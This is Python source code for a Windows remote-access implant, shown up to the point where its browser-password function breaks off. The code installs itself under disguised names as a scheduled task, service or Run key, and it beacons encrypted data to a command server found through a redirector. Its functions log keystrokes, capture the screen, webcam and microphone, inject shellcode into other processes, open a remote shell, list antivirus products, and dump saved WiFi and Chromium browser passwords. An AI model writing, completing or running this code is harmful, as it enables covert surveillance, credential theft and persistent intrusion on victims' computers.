
import os
import io
import queue
import re
import sys
import uuid
import json
import time
import base64
import random
import threading
import subprocess
import requests
import wmi
import winreg
import ctypes
from datetime import datetime
import ctypes.wintypes as wt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import mss
import cv2
import xml.etree.ElementTree as ET
import os
import tempfile
import pyaudio
import pythoncom
import wave
import keyboard
import glob
import numpy as np
# ===================== BROWSER PASSWORD DUMPER =====================
import sqlite3
import shutil
import win32crypt  # Requires: pip install pywin32 (on builder machine only)
from Cryptodome.Cipher import AES  # Requires: pip install pycryptodomex
import urllib3
import platform
import zlib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================== CONFIG =====================
REDIRECTOR_URL = "https://windows-updates.vercel.app/"
c2_url = ""                     # Dynamic — resolved at runtime
c2_fetch_backoff = 60.0         # seconds, float for easy *=
pending_results = []
screen_streaming = False
stream_active = False
stream_lock = threading.Lock()
stream_thread = None
results_lock = threading.Lock()
screen_streaming = False
screen_stream_lock = threading.Lock()
screen_stream_thread = None
shell_process = None
shell_output_queue = queue.Queue()
MAX_CHUNK_SIZE = 1024 * 1024
MAX_PENDING_RESULTS = 25
_wmi_initialized = False
_wmi_init_lock = threading.Lock()
# Global lock to prevent race conditions on WMI init
_wmi_lock = threading.Lock()

shell_processes = {}          # implant-wide, but only one session at a time


BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
SLEEP_BASE = 5   # seconds
JITTER_PCT = 20  # %
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
]

# Legitimate persistence names
LEGIT_PERSISTENCE_NAMES = [
    "OneDriveStandaloneUpdater",
    "MicrosoftEdgeUpdateTaskMachine",
    "GoogleUpdateTaskMachineCore",
    "AdobeUpdateService",
    "NvidiaTelemetryContainer",
]
# ================================================

aesgcm = AESGCM(BEACON_KEY)

def encrypt(data: bytes) -> bytes:
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, data, None)
    return nonce + ct

def decrypt(data: bytes) -> bytes:
    nonce = data[:12]
    ct = data[12:]
    return aesgcm.decrypt(nonce, ct, None)

def get_jittered_sleep():
    mean = SLEEP_BASE
    std_dev = SLEEP_BASE * (JITTER_PCT / 100.0)
    sleep = random.gauss(mean, std_dev)
    return max(sleep, 3)  # min 3s, ensure sleep is not negative or too short

def random_ua():
    return random.choice(USER_AGENTS)

def is_admin():
    """Checks for administrative privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except Exception:
        return False

def generate_implant_id():
    # Persistent ID from registry MachineGuid (stealthy)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        val, _ = winreg.QueryValueEx(key, "MachineGuid")
        winreg.CloseKey(key)
        return val.upper()
    except:
        pass
    # Fallback WMI
    try:
        return wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
    except:
        return str(uuid.uuid4())

def establish_persistence():
    """
    Establishes persistence using a dual-path logic based on privilege level.
    - Admin: Creates a high-privilege scheduled task.
    - User: Creates a standard Run key in the registry.
    This function is designed to be safe for compiled binaries and handles errors silently.
    """
    try:
        # 1. Frozen Path Check
        is_frozen = hasattr(sys, 'frozen')
        source_path = sys.executable if is_frozen else os.path.abspath(__file__)

        # 4. Stealth Path & Dynamic Naming
        admin_path = os.path.join(os.getenv("PROGRAMDATA"), "Microsoft", "Windows", "Containers")
        user_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Vault")

        # Dynamic Naming
        dynamic_names = ["vaultsvc.exe", "edgeupdate.exe", "onedrivesync.exe", "msteamsupdate.exe"]
        persist_filename = random.choice(dynamic_names)

        # Use is_admin() to determine the path
        if is_admin():
            is_server = 'server' in platform.release().lower() or 'server' in wmi.WMI().Win32_OperatingSystem()[0].Caption.lower()
            if is_server:
                persist_dir = r"C:\ProgramData\Microsoft\IdentityCRL"
            else:
                persist_dir = admin_path
        else:
            persist_dir = user_path

        persist_path = os.path.join(persist_dir, persist_filename)

        # 2. Self-Existence Check
        if source_path.lower() == persist_path.lower():
            return  # Already running from the persistence location

        # Create target directory if it doesn't exist
        os.makedirs(persist_dir, exist_ok=True)

        # Copy self to persistence location
        shutil.copy2(source_path, persist_path)

        # 3. Privilege-Aware Persistence Mechanism
        if is_admin():
            if is_server:
                # Server OS: Persist as a Windows Service
                service_name = "WinUpdateSvc"
                subprocess.run(
                    f'sc create "{service_name}" binpath= "{persist_path}" start= auto',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=0x08000000
                )
            else:
                # Admin (non-server): Scheduled Task
                task_name = "MicrosoftEdgeUpdateTaskMachineUA"
                subprocess.run(
                    [
                        "schtasks", "/Create",
                        "/TN", task_name,
                        "/TR", f'"{persist_path}"',
                        "/SC", "ONLOGON",
                        "/RL", "HIGHEST",
                        "/F"
                    ],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=0x08000000  # CREATE_NO_WINDOW
                )
        else:
            # User: Registry Run Key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = random.choice(LEGIT_PERSISTENCE_NAMES)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{persist_path}"')

    except Exception:
        # 5. Error Silence
        pass  # The main beacon loop must not crash

# ===================== TASK HANDLERS =====================
keylog_buffer = []
keylog_lock = threading.Lock()
last_window_title = None  # Use None to force initial title capture

def get_active_window_title():
    """Gets the title of the foreground window."""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value if buff.value else "Unknown"
    except Exception:
        return "Unknown"

def start_keylogger():
    def on_press(event):
        global last_window_title
        with keylog_lock:
            current_title = get_active_window_title()
            if current_title != last_window_title:
                last_window_title = current_title
                # Add a separator and the new window title context
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                keylog_buffer.append(f"\n\n--- [Active Window: {current_title} at {timestamp}] ---\n")

            # Append the key press in a more readable format
            key_name = event.name
            if key_name == "space":
                keylog_buffer.append(" ")
            elif key_name == "enter":
                keylog_buffer.append("[ENTER]\n")
            elif key_name == "backspace":
                keylog_buffer.append("[BACKSPACE]")
            elif len(key_name) > 1:  # e.g., 'ctrl', 'shift'
                keylog_buffer.append(f" [{key_name.upper()}] ")
            else:  # regular character
                keylog_buffer.append(key_name)

    keyboard.on_press(on_press)

def stop_keylogger():
    keyboard.unhook_all()
    global last_window_title
    last_window_title = None  # Reset for next start

def get_and_clear_keylog():
    with keylog_lock:
        if not keylog_buffer:
            return ""
        # Join the buffer which now contains a mix of characters and context strings
        log = "".join(keylog_buffer)
        keylog_buffer.clear()
        return log

def capture_screenshot():
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])
        buf = io.BytesIO()
        # Convert raw to JPEG
        from PIL import Image
        pil_img = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
        pil_img.save(buf, format="JPEG", quality=70)
        return buf.getvalue()

def capture_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        raise Exception("Webcam failed")
    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
    return buf.tobytes()


def record_mic(seconds=5, rate=44100, channels=1):
    p = pyaudio.PyAudio()

    stream = p.open(
        format=pyaudio.paInt16,
        channels=channels,
        rate=rate,
        input=True,
        frames_per_buffer=1024
    )

    frames = []
    for _ in range(int(rate / 1024 * seconds)):
        frames.append(stream.read(1024, exception_on_overflow=False))

    stream.stop_stream()
    stream.close()
    p.terminate()

    # IMPORTANT PART
    buffer = io.BytesIO()
    wf = wave.open(buffer, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()              # MUST close before reading buffer

    return buffer.getvalue()


def inject_shellcode(pid: int, sc: bytes):
    # Classic CreateRemoteThread injection
    kernel32 = ctypes.WinDLL('kernel32')
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40

    ph = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not ph:
        return "OpenProcess failed"
    alloc = kernel32.VirtualAllocEx(ph, 0, len(sc), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    if not alloc:
        return "VirtualAllocEx failed"
    written = ctypes.c_size_t()
    if not kernel32.WriteProcessMemory(ph, alloc, sc, len(sc), ctypes.byref(written)):
        return "WriteProcessMemory failed"
    th = kernel32.CreateRemoteThread(ph, None, 0, alloc, 0, 0, None)
    return f"Injected into PID {pid}" if th else "CreateRemoteThread failed"


def get_camera():
    # Try indices 0 through 2
    for i in range(3):
        cap = cv2.VideoCapture(i, cv2.CAP_DSHOW) # Use DSHOW for faster init on Windows
        if cap.isOpened():
            return cap
    return None

def enum_installed_software():
    """
    Enumerate installed software from Windows registry (both 64-bit and 32-bit applications).
    Returns a sorted list of dictionaries with common fields.
    Stealthy, no external commands, works on all modern Windows versions.
    """
    software_list = []

    # Registry paths for installed programs
    uninstall_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall",  # 32-bit on 64-bit OS
    ]

    def query_subkeys(base_key, path):
        try:
            key = winreg.OpenKey(base_key, path)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                try:
                    subkey = winreg.OpenKey(key, subkey_name)
                    app = {}

                    try:
                        app["DisplayName"], _ = winreg.QueryValueEx(subkey, "DisplayName")
                    except FileNotFoundError:
                        continue  # Skip if no name

                    try:
                        app["DisplayVersion"] = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                    except FileNotFoundError:
                        app["DisplayVersion"] = "N/A"

                    try:
                        app["Publisher"] = winreg.QueryValueEx(subkey, "Publisher")[0]
                    except FileNotFoundError:
                        app["Publisher"] = "N/A"

                    try:
                        app["InstallDate"] = winreg.QueryValueEx(subkey, "InstallDate")[0]
                        # Format as YYYY-MM-DD if possible
                        if len(app["InstallDate"]) == 8:
                            app["InstallDate"] = f"{app['InstallDate'][:4]}-{app['InstallDate'][4:6]}-{app['InstallDate'][6:]}"
                    except FileNotFoundError:
                        app["InstallDate"] = "N/A"

                    try:
                        app["InstallLocation"] = winreg.QueryValueEx(subkey, "InstallLocation")[0]
                    except FileNotFoundError:
                        app["InstallLocation"] = "N/A"

                    try:
                        size_str = winreg.QueryValueEx(subkey, "EstimatedSize")[0]
                        # Convert KB to MB if present
                        if size_str:
                            app["SizeMB"] = round(size_str / 1024, 1)
                        else:
                            app["SizeMB"] = "N/A"
                    except FileNotFoundError:
                        app["SizeMB"] = "N/A"

                    # Optional: Quiet uninstall string (indicator of silent removal capability)
                    try:
                        app["QuietUninstallString"] = winreg.QueryValueEx(subkey, "QuietUninstallString")[0]
                    except FileNotFoundError:
                        pass

                    software_list.append(app)

                    winreg.CloseKey(subkey)
                except:
                    continue
            winreg.CloseKey(key)
        except:
            pass

    # Query both HKLM (machine-wide) and HKCU (per-user) if needed
    for base in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
        for path in uninstall_paths:
            full_path = path if base == winreg.HKEY_LOCAL_MACHINE else path.replace("SOFTWARE", "Software")
            query_subkeys(base, full_path)

    # Sort by DisplayName for consistent output
    software_list.sort(key=lambda x: x.get("DisplayName", "").lower())

    # Limit to top 100 most relevant (avoid huge beacon payloads)
    limited_list = software_list[:100]

    # Add note if truncated
    if len(software_list) > 100:
        limited_list.append({
            "DisplayName": "[Truncated]",
            "DisplayVersion": "",
            "Publisher": "",
            "InstallDate": "",
            "InstallLocation": "",
            "SizeMB": f"... and {len(software_list) - 100} more applications"
        })


    return limited_list

# ===================== MAIN BEACON LOOP =====================
implant_id = generate_implant_id()
hostname = os.getenv("COMPUTERNAME")
username = os.getenv("USERNAME")
session = requests.Session()
session.verify = False  # match Go InsecureSkipVerify


def fetch_beacon_url() -> str:
    try:
        headers = {"User-Agent": random_ua()}
        resp = session.get(REDIRECTOR_URL, headers=headers, timeout=15)
        resp.raise_for_status()
    except Exception as e:
        raise Exception(f"Redirector fetch failed: {e}")

    html = resp.text

    # Primary: capture content between <div id="sysupdate">...</div>
    match = re.search(r'<div[^>]+id\s*=\s*["\']sysupdate["\'][^>]*>(.*?)</div>', html, re.I | re.S)
    if not match:
        # Fallback: no closing tag → grab until next < or end
        match = re.search(r'<div[^>]+id\s*=\s*["\']sysupdate["\'][^>]*>([^<]+)', html, re.I | re.S)
    if not match:
        raise Exception("C2 URL not found in redirector page")

    content = match.group(1).strip()

    # Extract first valid URL
    url_match = re.search(r'https?://[^\s"\'<>]+', content)
    if not url_match:
        raise Exception(f"No valid URL found in sysupdate div: '{content}'")

    c2_url = url_match.group(0).rstrip(".,;")  # clean trailing punctuation
    return c2_url

def chunk_large_output(tag: str, data: bytes):
    """
    Split large data into numbered chunks.
    Tag format: e.g., "SCREEN_STREAM_CHUNK:", "SCREENRECORD:", "AUDIO:"
    """
    global MAX_CHUNK_SIZE
    if len(data) <= MAX_CHUNK_SIZE:
        b64 = base64.b64encode(data).decode()
        return [f"{tag}{b64}"]

    chunks = []
    total_chunks = (len(data) + MAX_CHUNK_SIZE - 1) // MAX_CHUNK_SIZE
    for i in range(total_chunks):
        start = i * MAX_CHUNK_SIZE
        end = min(start + MAX_CHUNK_SIZE, len(data))
        chunk_data = data[start:end]
        b64 = base64.b64encode(chunk_data).decode()
        chunks.append(f"{tag}_CHUNK_{i+1}of{total_chunks}:{b64}")
    # Final marker
    chunks.append(f"{tag}_END")
    return chunks


def init_wmi():
    """
    Safely initialize COM for WMI in threaded environments.
    Called automatically on first WMI access.
    """
    global _wmi_initialized
    with _wmi_init_lock:
        if not _wmi_initialized:
            pythoncom.CoInitialize()
            _wmi_initialized = True


def main():

    establish_persistence()
    if "keylog" in sys.argv:  # optional: start keylogger early
        start_keylogger()
    global c2_url, c2_fetch_backoff, pending_results, MAX_PENDING_RESULTS

    while True:
        if not c2_url:
            try:
                c2_url = fetch_beacon_url()

                c2_fetch_backoff = 60.0  # reset
            except Exception as e:
                time.sleep(c2_fetch_backoff)
                if c2_fetch_backoff < 35 * 60:  # cap at 35 min like Go
                    c2_fetch_backoff *= 2

                continue
        # Periodic keylog exfil
        logs = get_and_clear_keylog()
        if logs:
            with results_lock:
                pending_results.append({"task_id": "keylog_periodic", "output": logs})

        with results_lock:
            if len(pending_results) > MAX_PENDING_RESULTS:
                # Prioritize streams/live data
                stream_results = [r for r in pending_results if r["output"].startswith(("SCREEN_STREAM_CHUNK:", "WEBCAM_STREAM_CHUNK:"))]
                other_results = [r for r in pending_results if not r["output"].startswith(("SCREEN_STREAM_CHUNK:", "WEBCAM_STREAM_CHUNK:"))]
                pending_results = stream_results[-15:] + other_results[-10:]  # Favor recent stream frames

        payload = {
            "id": implant_id,
            "os": "windows",
            "arch": "amd64",
            "user": username,
            "host": hostname,
            "results": pending_results[:]
        }
        try:
            enc_payload = encrypt(json.dumps(payload).encode())
            # User-Agent rotation happens here
            resp = session.post(c2_url, data=enc_payload, headers={"User-Agent": random_ua()}, timeout=30)

            # Raise an exception for non-200 status codes to be caught by the general exception handler
            resp.raise_for_status()

            dec_resp = decrypt(resp.content)
            tasks = json.loads(dec_resp).get("tasks", [])
            ack_ids = json.loads(dec_resp).get("ack_ids", [])

            # ACK processed results
            with results_lock:
                pending_results = [r for r in pending_results if r["task_id"] not in ack_ids]

            for task in tasks:
                threading.Thread(target=handle_task, args=(task,)).start()

        except Exception:
            # Hardened loop: Any failure in C2 communication will result in a jittered sleep,
            # preventing fast, detectable polling during C2 downtime.
            time.sleep(get_jittered_sleep())
            continue

        # Sleep after a successful beacon
        time.sleep(get_jittered_sleep())

# ============== SCREEN STREAM =============

def screen_stream_worker(duration: int = 0):  # 0 = indefinite
    global screen_streaming
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Primary full screen
        start_time = time.time()
        chunk_id = 0

        while screen_streaming:
            if duration > 0 and (time.time() - start_time) > duration:
                break

            img = sct.grab(monitor)
            # Fast raw → numpy → JPEG encode (smaller than PNG for stream)
            frame_np = np.array(img)
            frame_bgr = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode('.jpg', frame_bgr, [int(cv2.IMWRITE_JPEG_QUALITY), 70])

            b64_chunk = base64.b64encode(buffer).decode()
            result = {
                "task_id": f"screen_stream_chunk_{chunk_id}",
                "output": f"SCREEN_STREAM_CHUNK:{b64_chunk}"
            }
            with results_lock:
                pending_results.append(result)

            chunk_id += 1
            # No sleep - capture as fast as possible for real-time performance

        # Send end marker
        with results_lock:
            pending_results.append({"task_id": "screen_stream_end", "output": "SCREEN_STREAM_END"})

def start_screen_stream(duration_sec: int = 0):
    global screen_streaming, screen_stream_thread
    with screen_stream_lock:
        if screen_streaming:
            return "Already running"
        screen_streaming = True
        screen_stream_thread = threading.Thread(target=screen_stream_worker, args=(duration_sec,), daemon=True)
        screen_stream_thread.start()
        return f"Screen stream started ({'indefinite' if duration_sec == 0 else f'{duration_sec}s'})"

def stop_screen_stream():
    global screen_streaming
    with screen_stream_lock:
        if not screen_streaming:
            return "Not running"
        screen_streaming = False
        if screen_stream_thread:
            screen_stream_thread.join(timeout=3)
        return "Screen stream stopped"


# ===================== WIFI TOOLS =====================

def dump_wifi_profiles():
    """
    Dump saved WiFi passwords by parsing XML profiles and decrypting with DPAPI.
    This is a stealthier method than using netsh.
    """
    results = []
    profiles_path = r"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"

    if not os.path.exists(profiles_path):
        return "WiFi profiles directory not found."

    for interface_folder in os.listdir(profiles_path):
        interface_path = os.path.join(profiles_path, interface_folder)
        for profile_xml in os.listdir(interface_path):
            if not profile_xml.lower().endswith('.xml'):
                continue

            try:
                tree = ET.parse(os.path.join(interface_path, profile_xml))
                root = tree.getroot()
                namespace = root.tag.split('}')[0][1:]  # Extracts namespace

                ssid = root.find(f"{{{namespace}}}SSIDConfig/{{{namespace}}}SSID/{{{namespace}}}name").text
                auth = root.find(f"{{{namespace}}}MSM/{{{namespace}}}security/{{{namespace}}}authEncryption/{{{namespace}}}authentication").text

                key_material_node = root.find(f"{{{namespace}}}MSM/{{{namespace}}}security/{{{namespace}}}sharedKey/{{{namespace}}}keyMaterial")
                password = "[OPEN/NO PASSWORD]"

                if key_material_node is not None:
                    encrypted_hex = key_material_node.text
                    encrypted_bytes = bytes.fromhex(encrypted_hex)

                    # Decrypt with DPAPI
                    decrypted_bytes = win32crypt.CryptUnprotectData(encrypted_bytes, None, None, None, 0)[1]
                    password = decrypted_bytes.decode('utf-8', errors='ignore')

                results.append(f"{ssid} | {password} | {auth}")
            except Exception:
                # Could be a profile without a password or a parsing error
                ssid_name = "Unknown SSID"
                try:
                    ssid_name = root.find(f"{{{namespace}}}SSIDConfig/{{{namespace}}}SSID/{{{namespace}}}name").text
                except:
                    pass
                results.append(f"{ssid_name} | [DECRYPT FAILED/NO KEY] | Unknown")

    if not results:
        return "No saved WiFi profiles found."

    header = "WIFI_PASSWORDS_DUMPED (XML Method):\n"
    header += f"{'SSID':<40} {'PASSWORD':<30} {'AUTH'}\n"
    header += "-" * 100 + "\n"
    body = "\n".join(results)
    footer = f"\n\nTotal networks: {len(results)}"
    return header + body + footer

def scan_available_wifi():
    """Scan for nearby WiFi networks"""
    try:
        subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=Bssid"],
                              text=True)  # Ensure driver supports scan

        data = subprocess.check_output(
            ["netsh", "wlan", "show", "networks", "mode=Bssid"],
            text=True,
            encoding="utf-8",
            errors="ignore"
        )

        networks = []
        blocks = re.split(r"\nSSID \d+ :", data)[1:]  # Split by SSID blocks
        for block in blocks:
            ssid_match = re.search(r"^\s*(.+?)\s*\n", block)
            signal_match = re.search(r"Signal\s+:\s+(\d+)%", block)
            auth_match = re.search(r"Authentication\s+:\s+(.*)", block)
            encryption_match = re.search(r"Encryption\s+:\s+(.*)", block)

            ssid = ssid_match.group(1).strip() if ssid_match else "[Hidden SSID]"
            signal = signal_match.group(1) + "%" if signal_match else "Unknown"
            auth = auth_match.group(1).strip() if auth_match else "Open"
            enc = encryption_match.group(1).strip() if enc_match else "None"

            networks.append(f"{ssid} | {signal} | {auth} | {enc}")

        if not networks:
            return "No networks detected (driver may not support scan)."

        header = "WIFI_SCAN_RESULTS:\n"
        header += f"{'SSID':<40} {'SIGNAL':<10} {'AUTH':<15} {'ENCRYPTION'}\n"
        header += "-" * 100 + "\n"
        body = "\n".join(networks[:30])  # Limit to top 30
        footer = f"\n\nNetworks detected: {len(networks)} (showing top 30)"
        return header + body + footer

    except Exception as e:
        return f"WIFI_SCAN_ERROR: {str(e)}"


# ===================== NEW: REVERSE WEBCAM STREAM =====================

def webcam_stream_worker(duration: int):
    """Capture webcam frames and push as multipart chunks via beacon results"""
    global stream_active
    global webcam_streaming
    webcam_streaming = True
    cap = get_camera()

    if cap is None:
        with results_lock:
            pending_results.append({"task_id": "webcam_live", "error": "No camera found"})
        webcam_streaming = False
        stream_active = False
        return
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return

    fps = 15
    interval = 1.0 / fps
    start_time = time.time()
    chunk_id = 0

    boundary = "aptframeboundary"
    while stream_active and (duration == 0 or time.time() - start_time < duration):
        ret, frame = cap.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
        jpg_bytes = buffer.tobytes()

        # Build multipart part
        part = (
            f"--{boundary}\r\n"
            f"Content-Type: image/jpeg\r\n"
            f"Content-Length: {len(jpg_bytes)}\r\n"
            f"X-Frame-Index: {chunk_id}\r\n\r\n"
        ).encode() + jpg_bytes + b"\r\n"

        # Immediate exfil as result (no wait for next beacon)
        result = {
            "task_id": f"webcam_stream_chunk_{chunk_id}",
            "output": f"SWEBCAM_STREAM_CHUNK:{base64.b64encode(part).decode()}"
        }
        with results_lock:
            pending_results.append(result)

        chunk_id += 1
        # No sleep - capture as fast as possible

    cap.release()
    # Final chunk marker
    final = {
        "task_id": "webcam_stream_end",
        "output": "SWEBCAM_STREAM_END"
    }
    with results_lock:
        pending_results.append(final)

def start_webcam_stream(duration_sec: int = 0):  # 0 = indefinite until stop
    global stream_active, stream_thread
    with stream_lock:
        if stream_active:
            return "Already running"
        stream_active = True
        stream_thread = threading.Thread(target=webcam_stream_worker, args=(duration_sec,), daemon=True)
        stream_thread.start()
        return f"Webcam stream started (duration={'indefinite' if duration_sec==0 else f'{duration_sec}s'})"

def stop_webcam_stream():
    global stream_active
    with stream_lock:
        if not stream_active:
            return "Not running"
        stream_active = False
        if stream_thread:
            stream_thread.join(timeout=5)
        return "Webcam stream stopped"


# === implant.py – Fixed get_sysinfo() with Thread-Safe WMI Initialization ===
def get_sysinfo():
    """
    Comprehensive system information gathering for Windows implants.
    Now fully thread-safe with proper COM initialization.
    """
    info = {}

    try:
        # Basic platform info (no COM required)
        import platform
        info["hostname"] = platform.node()
        info["os"] = platform.system()
        info["os_version"] = platform.version()
        info["os_release"] = platform.release()
        info["platform"] = platform.platform()
        info["architecture"] = platform.machine()
        info["processor"] = platform.processor()
    except Exception as e:
        info["platform_error"] = str(e)

    # Thread-safe WMI access
    try:
        with _wmi_lock:  # Ensure only one thread initializes COM at a time
            pythoncom.CoInitialize()  # Safe to call multiple times
            c = wmi.WMI()

            # Operating System
            os_wmi = c.Win32_OperatingSystem()[0]
            info["os_caption"] = os_wmi.Caption
            info["os_build"] = os_wmi.BuildNumber

            # Robust WMI timestamp parsing
            def parse_wmi_timestamp(wmi_ts):
                if not wmi_ts or not wmi_ts.strip():
                    return None
                try:
                    ts_str = wmi_ts.split('.')[0]
                    return datetime.strptime(ts_str, "%Y%m%d%H%M%S").isoformat()
                except:
                    return None

            info["install_date"] = parse_wmi_timestamp(os_wmi.InstallDate)
            info["boot_time"] = parse_wmi_timestamp(os_wmi.LastBootUpTime)

            # Computer System
            cs = c.Win32_ComputerSystem()[0]
            info["manufacturer"] = cs.Manufacturer
            info["model"] = cs.Model
            info["total_physical_memory_gb"] = round(int(cs.TotalPhysicalMemory) / (1024**3), 2)
            info["domain"] = cs.Domain

            # Processor
            cpu = c.Win32_Processor()[0]
            info["cpu_name"] = cpu.Name.strip()
            info["cpu_cores"] = cpu.NumberOfCores
            info["cpu_logical_processors"] = cpu.NumberOfLogicalProcessors
            info["cpu_max_clock_mhz"] = cpu.MaxClockSpeed

            # BIOS
            bios = c.Win32_BIOS()[0]
            info["bios_version"] = bios.SMBIOSBIOSVersion
            info["bios_date"] = bios.ReleaseDate[:8] if bios.ReleaseDate else None

            # Disk drives
            disks = []
            for disk in c.Win32_DiskDrive():
                if disk.Size:
                    disks.append({
                        "model": disk.Model.strip(),
                        "size_gb": round(int(disk.Size) / (1024**3), 2),
                        "media_type": disk.MediaType
                    })
            info["disks"] = disks

            # Network IPs
            ips = []
            for iface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
                if iface.IPAddress:
                    for ip in iface.IPAddress:
                        ips.append(ip)
            info["ip_addresses"] = ips

            # Antivirus detection
            av_products = []
            for namespace in ["root\\SecurityCenter2", "root\\SecurityCenter"]:
                try:
                    for av in wmi.WMI(namespace=namespace, class_name="AntiVirusProduct"):
                        av_products.append(av.displayName)
                    break  # Success → stop trying older namespaces
                except:
                    continue
            info["antivirus"] = av_products or ["Not detected"]

    except Exception as e:
        info["wmi_error"] = str(e)

    # Runtime info (psutil – optional but recommended)
    try:
        import psutil
        info["cpu_percent"] = psutil.cpu_percent(interval=1)
        info["memory_percent"] = psutil.virtual_memory().percent
        info["memory_used_gb"] = round(psutil.virtual_memory().used / (1024**3), 2)
        info["memory_total_gb"] = round(psutil.virtual_memory().total / (1024**3), 2)
        info["uptime_seconds"] = int(time.time() - psutil.boot_time())
    except Exception as e:
        info["psutil_error"] = str(e)

    # Admin check
    try:
        info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() == 1
    except:
        info["is_admin"] = False

    # Machine GUID
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        machine_guid, _ = winreg.QueryValueEx(key, "MachineGuid")
        winreg.CloseKey(key)
        info["machine_guid"] = machine_guid.upper()
    except:
        info["machine_guid"] = "unknown"

    # Public IP (fallback if socket fails)
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["public_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["public_ip"] = "unknown"

    info["collected_at"] = datetime.now().isoformat()

    return json.dumps(info, separators=(',', ':'))  # Compact JSON for beacon


def shell_worker():
    global shell_process
    # Start a persistent cmd.exe session
    shell_process = subprocess.Popen(
        ["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, shell=True, text=True, bufsize=1
    )

    # Reader thread to push output to a queue
    def reader():
        for line in iter(shell_process.stdout.readline, ""):
            shell_output_queue.put(line)

    threading.Thread(target=reader, daemon=True).start()


def dump_browser_passwords():
    """
    Extracts saved passwords from all Chromium-based browsers (Chrome, Edge, Brave, etc.).
    Returns a formatted string with URL | Username | Password.
    """
    results = []
    master_key = None

    # Common Chromium browser profiles
    browser_paths = [
        (os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default", "Chrome"),
        (os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default", "Edge"),
        (os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Default", "Brave"),
        (os.getenv("LOCALAPPDATA") + r"\Opera Software\Opera Stable", "Opera"),
        # Add more as needed
    ]

    for path, browser_name in browser_paths:
        login_db = os.path.join(path, "Login Data")
        if not os.path.exists(login_db):
            continue

        try:
            # Copy DB to temp to avoid lock
            temp_db = os.path.join(tempfile.gettempdir(), f"LoginData_{uuid.uuid4().hex}")
            shutil.copy2(login_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            # Get master key (only once per browser)
            if master_key is None:
                key_path = os.path.join(path, "Local State")
                if os.path.exists(key_path):
                    with open(key_path, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]

                if not encrypted_password:
                    continue

                try:
                    encrypted_password = row[2]
                    if len(encrypted_password) < 16:  # Too short for v10/v11
